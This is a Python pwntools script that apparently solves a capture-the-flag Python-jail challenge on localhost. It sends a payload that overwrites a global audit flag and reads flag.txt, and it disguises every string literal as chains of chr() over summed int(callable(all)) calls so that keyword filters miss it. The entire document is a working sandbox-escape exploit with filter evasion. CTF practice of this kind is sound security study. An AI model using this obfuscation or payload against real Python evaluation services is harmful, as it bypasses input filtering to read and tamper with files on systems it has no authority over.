import re

from pwn import *

HOST = 'localhost'
PORT = 4041

payload = '''
getattr(globals(), '__setitem__')('first_audit', callable(all))
print(getattr(open('flag.txt', 'r'), 'read')())
EOF
'''

strings = re.findall("'(.*?)'", payload)
for s in set(strings):
	crafted_str = []
	for c in s:
		crafted_ord = ['int(callable(all))'] * ord(c)
		crafted_chr = 'chr(' + '+'.join(crafted_ord) + ')'
		crafted_str.append(crafted_chr)
	crafted_str = '+'.join(crafted_str)
	payload = payload.replace(f"'{s}'", crafted_str)

r = remote(HOST, PORT)

print(r.recvuntil(b'inspection:\n').decode())
print(payload)

r.sendline(payload.encode())
print(r.recvall().decode())
